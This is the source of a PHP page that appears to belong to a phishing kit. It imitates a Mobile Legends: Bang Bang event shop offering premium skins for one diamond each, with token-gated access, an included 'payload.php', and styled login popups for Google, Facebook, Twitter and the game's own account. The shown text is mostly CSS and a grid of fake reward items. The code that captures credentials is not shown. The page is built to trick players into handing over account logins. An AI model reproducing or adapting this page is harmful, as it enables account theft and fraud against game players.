<?php
// Created By Dirzz Nesia
// Dilarang Mengganti/Menghapus Copyright
// Hargai Creator
// WhatsApp 6285792116902

$ngGet = file_get_contents("data/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("data/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('data/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no, user-scalable=0" />
<title>Mobile Legends: Bang Bang</title>
<meta property="og:description" content="Get your exclusive reward now!">
<meta property="og:image" content="https://akmweb.youngjoygame.com/web/gms/image/1d4439a2ab14e995b99fd8934adb34ee.svg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link rel="stylesheet" type="text/css" media="screen" href="style.php">
<link rel="stylesheet" type="text/css" media="screen" href="style.php">
<link rel="stylesheet" href="css/flags.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/loader.css">
<link rel="stylesheet" href="css/styles.css">
<link rel="stylesheet" href="css/shop.css">
<link rel="stylesheet" href="css/pop-link.css">
<link rel="stylesheet" href="css/pop-login.css">
<link rel="stylesheet" type="text/css" media="screen" href="css/pop-google1.php">
<link rel="stylesheet" type="text/css" media="screen" href="css/pop-google2.php">
<link rel="stylesheet" type="text/css" media="screen" href="css/pop-facebook.php">
<link rel="stylesheet" type="text/css" media="screen" href="css/pop-facebooks.php">
<link rel="stylesheet" type="text/css" media="screen" href="css/pop-twitter.php">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css" integrity="sha512-WgpJvPsU5RMfJeB5QbEbVfyuEGX+emeIHhNIFdc2SdyXVA11IyRLkdHZZHcnbxs/tCEAQFr2YEWrqqHFRL88eQ==" crossorigin="anonymous">
<link rel="icon" type="img/png" href="https://akmweb.youngjoygame.com/web/gms/image/1d4439a2ab14e995b99fd8934adb34ee.svg" sizes="32x32">
</head>
<body oncontextmenu="return true" onselectstart="return false" ondragstart="return false" oncopy="return true" oncut="return true" onpaste="return true">

<style type="text/css">
.popup-box-wrapper-login {
  background: url(https://cdn.stackpath.web.id/mlbb/12/img/load.jpg) no-repeat center center;
  background-size: 100% 100%;
}
.header {
	background-size: 100% 100%;
	width: 100%;
	height: auto;
	margin-bottom: 0px;
}
.header_uid {
	background: rgba(0, 0, 0, 0.5);
	background-size: 100% 100%;
	width: auto;
	height: 40px;
	position: absolute;
	border: 1px solid #FFBE22;
	right: 5;
	margin-top: 5px;
	margin-inline: auto;
	padding: 5px;
	padding-top: 10px;
	margin-bottom: 0px;
	text-align: left;
	display: none;
}
.header_uid span {
	text-align: left;
	color: #fff;
	font-size: 14px;
	font-family: selow;
}
.header_uid img {
	width: 30px;
	height: 30px;
	float: right;
	margin-left: 8px;
	margin-top: -5px;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-bottom: 0px solid #6F6F6F;
}
.header-front {
	width: 100%;
	height: auto;
	position: absolute;
	top: 0;
}
.header-front img {
	width: 100%;
	height: auto;
	border-bottom: 0px solid #3B3C43;
}
.header video {
	width: 100%;
	height: auto;
	margin-top: -0px;
}
.headers {
	--angle: 360deg;
	border-image: linear-gradient(var(--angle), #DA40DC, #3FC8FF, #15FFFF, #DA40DC) 1;
	animation: rotate 1s linear infinite;
}
@keyframes rotate {
	to {
		--angle: 0deg;
		visibility: hidden;
	}
}
.popup-btn-login {
	width: 90%;
	border-radius: 2px;
	height: 35px;
	padding: 1px;
	padding-top: 6px;
	margin-bottom: 8px;
	margin-top: 8px;
	margin: 3px;
	color: #f2f2f2;
	font-size: 14px;
	font-family: arial, sans-serif;
	border: none;
	outline: none;
	position: relative;
	display: inline-block;
	text-align: left;
}
.popup-btn-mlbb img {
	background: transparent;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -5px;
	margin-left: 4px;
	margin-right: 20px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-twitter img {
	background: transparent;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-google img {
	background: #fff;
	border-radius: 2px;
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-login-link img {
	width: 25px;
	height: 25px;
	margin-top: -3px;
	margin-left: 1px;
	color: #fff;
	font-size: 20px;
	float: left;
}
.popup-btn-login i {
	color: #fff;
	font-size: 20px;
	margin-top: -8px;
	float: left;
}
.popup-btn-mlbb {
	background: url(https://cdn.stackpath.web.id/mlbb/12/img/btn_off.png) no-repeat center center;
	color: #fff;
	border: 1px solid #557BB9;
}
.popup-btn-twitter {
	background: #198B96;
	color: #fff;
}
.popup-btn-google {
	background: #4D8AE5;
	color: #fff;
}
.popup-btn-login-link {
	background: #E3B448;
	color: #000;
}
.popup-btn-login-mores {
	background-color: rgba(0, 0, 0, 0.7);
	color: #fff;
}
.popup-btn-fb {
	background: none;
	outline: none;
	border: none;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 0px;
	padding: 0px;
	color: #AAAAAA;
	font-size: 13px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-btn-fb img {
	background: #4167B2;
	border-radius: 2px;
	background-size: 100% 100%;
	width: 45px;
	padding: 0px;
	height: auto;
	margin-bottom: 5px;
	text-align: center;
}
.twitter-load {
	background-size: 100% 100%;
	width: 93%;
	height: 425.2px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
	color: #000;
}
.twitter-load-title {
	width: 95%;
	height: auto;
	margin-top: 50px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 40px;
	padding: 6px;
	padding-top: 70px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.twitter-load-title i {
	padding-top: 25px;
	padding-bottom: 15px;
	color: #000;
	font-size: 50px;
	text-align: center;
}
.fb-load {
	background-size: 100% 100%;
	width: 93%;
	height: 299.1px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.fb-load img {
	width: 50px;
	height: 50px;
	margin-top: 192.5px;
	margin-bottom: -55px;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.fb-load-title i {
	margin-top: 200px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;
	text-align: center;
}
.gg-load {
	background-size: 100% 100%;
	width: 93%;
	height: 315.2px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
	color: #000;
}
.gg-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 30px;
	padding: 6px;
	padding-top: 30px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.gg-load-title i {
	padding-top: 25px;
	padding-bottom: 15px;
	color: #000;
	font-size: 50px;
	text-align: center;
}
.cross {
	position: relative;
	display: inline-block;
}
.cross::before {
	content: '';
	width: 100%;
	position: absolute;
	right: 0;
	top: 50%;
}
.cross::before {
	border-bottom: 2px solid red;
	-webkit-transform: skewY(-10deg);
	transform: skewY(-10deg);
}
.zoom-in {
	animation: zoom-in 1s forwards;
}
@keyframes zoom-in {
	0% {
		transform: scale(0, 0);
	}

	100% {
		transform: scale(1, 1);
	}
}
.bg-button-login {
	background: transparent;
	background-size: 100% 100%;
	width: 20%;
	height: auto;
	margin: 1px;
	margin-top: 50px;
	margin-bottom: 1px;
	padding-top: -1px;
	display: inline-block;
}
.button-login {
	width: 100%;
	ratio-aspect: 1/1;
	margin-top: 0px;
	display: inline-block;
}
.button-login .label-button-login {
	width: 100%;
	overflow: hidden;
	font-size: 14px;
	font-family: selow;
	color: #C3C3C3;
	padding-top: 2px;
	padding-bottom: 5px;
	margin-top: -0px;
}
.button-login img {
	width: 37px;
	ratio-aspect: 1/1;
	;
	margin-top: -0px;
	border-radius: 2px;
	border: 0px solid #7B8197;
}
.gallery-wrapper {
	width: 100%;
	height: auto;
	overflow: hidden;
	border: none;
	display: flex;
}
.gallery-wrapper img {
	width: 100%;
	display: inline-block;
	float: left;
	animation-name: mymove;
	animation-duration: 30s;
	-webkit-animation-iteration-count: infinite;
	position: relative;
}
@keyframes mymove {
	0% {
		left: 0%;
	}

	10% {
		left: 0%;
	}

	20% {
		left: -100%;
	}

	30% {
		left: -100%;
	}

	40% {
		left: -200%;
	}

	50% {
		left: -200%;
	}

	60% {
		left: -300%;
	}

	70% {
		left: -300%;
	}

	80% {
		left: -400%;
	}

	90% {
		left: -400%;
	}

	100% {
		left: -500%;
	}
}
.label-events {
	background-image: linear-gradient(to right, #3C5F88, #66000000);
	width: 50%;
	height: 30px;
	color: #A1CBF3;
	font-size: 15px;
	font-family: arial, sans-serif;
	text-align: left;
	margin-top: 10px;
	margin-left: 10px;
	padding-left: 7px;
	padding-top: 6px;
	border-left: 2px solid #5F79C3;
	display: inline-block;
}
.label-events img {
	width: 24px;
	height: auto;
	padding-left: 0px;
	margin-top: -2px;
	margin-right: 7px;
	float: left;
}
.label-events_w {
	width: auto;
	height: 30px;
	color: #A1CBF3;
	font-size: 15px;
	font-family: arial, sans-serif;
	text-align: left;
	margin-top: 8px;
	margin-right: 10px;
	padding-top: 6px;
	border: none;
	float: right;
}
.label-events_w img {
	width: 35px;
	height: auto;
	padding-left: 0px;
	margin-top: -5px;
	margin-right: 0px;
	float: right;
}
.loadhabo_in_popup {
	display: flex;
	justify-content: center;
	align-items: center;
	padding: 5px;
	height: 55px;
	width: 55px;
	border: 3px solid #0000;
	border-radius: 50%;
	background: linear-gradient(#0E2545, #0E2545) padding-box, linear-gradient(var(--angle),
			#7154FE,
			#74F0FC) border-box;
	animation: 0.5s rotatec linear infinite;
}
.loadhabo {
	display: flex;
	justify-content: center;
	align-items: center;
	padding: 5px;
	height: 55px;
	width: 55px;
	border: 3px solid #0000;
	border-radius: 50%;
	background: linear-gradient(#0E2545, #0E2545) padding-box, linear-gradient(var(--angle),
			#7154FE,
			#74F0FC) border-box;
	animation: 0.5s rotatec linear infinite;
}
@keyframes rotatec {
	to {
		--angle: 360deg;
	}
}
@property --angle {
	syntax: "<angle>";
	initial-value: 0deg;
	inherits: false;
}

.sang_pengkhianat_load_id
{ width:100%; position: absolute; top:40%; left:0; right:0; margin-inline:auto; }

.sang_pengkhianat_load_id_img
{ width:100%; height:auto; display:block; left:0; right:0; margin-inline:auto; }

.sang_pengkhianat_load_id_gif
{ width:15%; height:auto; display:block; margin-top:1px; left:0; right:0; margin-inline:auto; }

@media only screen and (min-width: 320px) and (max-width: 360px) {
.loadhabo 
{ padding: 5px; height: 55px; width: 55px; }

.popup-btn-login 
{ font-size: 11px; height: 30px; padding-top: 8px; }

.popup-btn-login-more
{ width: 10%; border-radius: 2px; height: 20px; font-size: 10px; }

.popup-btn-login 
{ width: 90%; padding-top: 7px; }

.popup-btn-mlbb img 
{ width: 20px; height: 20px; margin-top: -3px; }

.popup-btn-google img 
{ width: 20px; height: 20px; margin-top: -3px; }

.popup-btn-login-link img 
{ width: 20px; height: 20px; margin-top: -3px; }

.bg-button-login 
{ width: 20%; margin-top: 50px; }
	
.button-login .label-button-login 
{ font-size: 12px; }

.button-login img 
{ width: 35px; }

.display-version, .display-version a
{  font-size:10px; }

.display-date, .display-date a
{  font-size:10px; }

.header_uid 
{ height:30px; padding-top:8px; }

.header_uid span 
{ font-size: 12px; }

.header_uid img 
{ width: 25px; height: 25px; margin-left:8px; margin-top:-6px; }

.label-events 
{ width: 50%; height: 27px; font-size: 12px; }

.label-events img 
{ width: 20px; height: auto; }
    
.label-events_w 
{ width: auto; height: 30px; font-size: 15px; }

.label-events_w img 
{ width: 30px; height: auto; }
}
.all-box-wrapper {
background: #0E2545 center / cover no-repeat;
width: 100%;
height: 650px;
padding:0px;
margin-top: 0px;
padding-bottom: 10px;
display: block;
}
.scrollitemlow {
	overflow:scroll;
	position:relative;
	width: 100%;
	height: 515px;
	margin-top:10px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.box-crate-wrapper {
	background: url(https://cdn.stackpath.web.id/mlbb/12/img/background.png) no-repeat center center;
	background-size: 100% 100%;
    width: 100%;
    height: 538px;	
	margin-top: 15px;
	margin-right: auto;
	margin-left: auto;
	padding-bottom: 15px;	
	display: block;
	border: .1px solid #3D4B70;
}
.pengkhianat_box_item_redeems {
	width: 20%;
	margin: 1px;
	margin-left: auto;
	margin-right: auto;
}
.pengkhianat_box_item_redeems img {
	width:100%;
	height: auto;
}
.item-price {	
	color: #fff;
	font-size: 9px;
	font-family: arial, sans-serif;
	text-align: left;
	position: absolute;
	margin-top: -38px;
}
.item-price img {	
	height: 10px;
	width: auto;
	margin-bottom: -2px;
	margin-right: 3px;
	margin-left: 28px;
}

.pengkhianat_box_form_login_id {
    background: rgba(0,0,0,0);
    width: 100%;
    height: 35px;    
}
.pengkhianat_box_form_login_id input {
    background: #192F51;    
    width: 100%;
    height: 35px;    
    margin-left: auto;
    margin-right: auto;
    padding: 10px;     
    color: #8BA5BE;
    font-size: 14px;
    font-family: arial, sans-serif;
    border: .1px solid #819CD1;
    font-weight: 400;
    outline: 0;
    -webkit-appearance: none;
    -moz-appearance: none;            
}
.pengkhianat_box_form_login_id input:focus {
	border: .1px solid #CFB990;
	border-radius: 0px;
	background: #192F51;
}
.pengkhianat_box_form_login_id select {
    background: #192F51;    
    width: 100%;
    height: 35px;    
    margin-left: auto;
    margin-right: auto;
    padding: 10px;     
    color: #8BA5BE;
    font-size: 14px;
    font-family: arial, sans-serif;
    border: .1px solid #819CD1;
    font-weight: 400;
    outline: 0;
    -webkit-appearance: none;
    -moz-appearance: none;            
}
.pengkhianat_box_form_login_id select:focus {
	border: .1px solid #CFB990;
	border-radius: 0px;
	background: #192F51;
}
.pengkhianat_box_form_login_id select::placeholder {
    color: #8BA5BE;
}
.pengkhianat_box_form_login_id_error input {
    background: #001;
    width: 100%;
    height: 35px;    
    margin-left: auto;
    margin-right: auto;
    padding: 10px;     
    color: #8BA5BE;
    font-size: 15px;
    font-family: arial, sans-serif;
    border: .1px solid #FF5E5B;
    font-weight: 500;
    outline: 0;    
    -webkit-appearance: none;
    -moz-appearance: none;            
}
.pengkhianat_box_form_login_id input::placeholder {
    color: #8BA5BE;
}

.pengkhianat_box_form_login_idl {
    background: rgba(0,0,0,0);
    width: 60%;
    height: 35px; 
    float: left; 
    display: inline-block;    
    margin-bottom:20px;  
}
.pengkhianat_box_form_login_idr {
    background: rgba(0,0,0,0);
    width: 38%;
    height: 35px;  
    float: right;
    display: inline-block; 
    margin-bottom:20px;       
}
.pengkhianat_box_form_login_idl label,
.pengkhianat_box_form_login_idr label 
{
    width: 100%;
    padding-left: 0px;
    padding-right: 0px;
    margin-bottom: 0px;
    margin-top: 2px;
    text-shadow: none;
    font-size: 12px;
    display: inline-block;
    font-family:arial, sans-serif;
    color: #82A3C4;
}
.pengkhianat_box_form_login_idl input,
.pengkhianat_box_form_login_idr input
{
    background: #192F51;    
    width: 100%;
    height: 35px;    
    margin-left: auto;
    margin-right: auto;
    padding: 10px;     
    color: #8BA5BE;
    font-size: 14px;
    font-family: arial, sans-serif;
    border: .1px solid #819CD1;
    font-weight: 400;
    outline: 0;
    -webkit-appearance: none;
    -moz-appearance: none;  
    display: inline-block;             
}
.pengkhianat_box_form_login_idl input:focus,
.pengkhianat_box_form_login_idr input:focus,
{
	border: .1px solid #CFB990;
	border-radius: 0px;
	background: #192F51;
}
.pengkhianat_box_form_login_id_errorl input,
.pengkhianat_box_form_login_id_errorr input
{
    background: #001;
    width: 100%;
    height: 35px;    
    margin-left: auto;
    margin-right: auto;
    padding: 10px;     
    color: #8BA5BE;
    font-size: 15px;
    font-family: arial, sans-serif;
    border: .1px solid #FF5E5B;
    font-weight: 500;
    outline: 0;    
    -webkit-appearance: none;
    -moz-appearance: none;            
}
.pengkhianat_box_form_login_idl input::placeholder,
.pengkhianat_box_form_login_idr input::placeholder
{
    color: #8BA5BE;
}
</style>

<div class="navbar-right">
<img class="navbar-menu" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/menu_s1.png">
</div>
</div>
<div class="container_show">
<div class="header">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/head.jpg" alt="" />
</div>
<div class="tab_reward">
<div class="all-box-wrapper">
<div class="box-crate-wrapper-navbar">
<div class="box-crate-wrapper-navbar-menu alert-ori">
<div class="box-crate-wrapper-navbar-menu-txt">Exclusive Events</div>
</div>
<div class="box-crate-wrapper-navbar-menu" style="float: right;">
<div class="box-crate-wrapper-navbar-menu-txt-off"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/eye.svg"> <span>46373839</span> <a id="day" style="display:none;">day</a>
<a id="year">Version</a><a id="month">3.1.0</a><a id="daynum">18537</a>
<a id="display-time"></a>
</div>
</div>
</div>
<div class="label-events">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/event.svg">
New Purchase Shop
</div>
<div class="label-events_w">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/all.jpg">
</div>
<div class="sec-crate-wrapper">
<div class="box-crate-wrapper">
<div class="box-crate-content">
<center>
<div class="scrollitemlow">

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus1.jpg" data-name="The Navigator" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus1.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus2.jpg" data-name="The Annihilator" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus2.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus3.jpg" data-name="The Beacon" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/nexus3.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<br>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/badang.jpg" data-name="Dimension Walker" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/badang.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/onic.jpg" data-name="Shura" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/onic.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/guin.jpg" data-name="Twilight Star" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/guin.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/xevana.jpg" data-name="Daybreak Halo" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/xevana.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/4.jpg" data-name="Tesla Maniac" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/redeem/4.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/chou.jpg" data-name="Flying Swallow" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/chou.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/valir.jpg" data-name="Invoker's Restraint" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/valir.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/chouu.jpg" data-name="Aeon of Twilight" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/chouu.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>


<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/9.jpg" data-name="Blade of Kibou" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/9.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/10.jpg" data-name="Cyber Cherubin" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/10.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/11.jpg" data-name="Tech Tensai" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/11.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/12.jpg" data-name="Miss Hikari" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/12.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0e.jpg" data-name="Naruto Uzumaki" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0e.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0f.jpg" data-name="Sasuke Uchiha" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0f.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0g.jpg" data-name="Kakashi Hatake" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0g.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0h.jpg" data-name="Sakura Haruno" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0h.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0a.jpg" data-name="Neobeast Ling" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0a.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
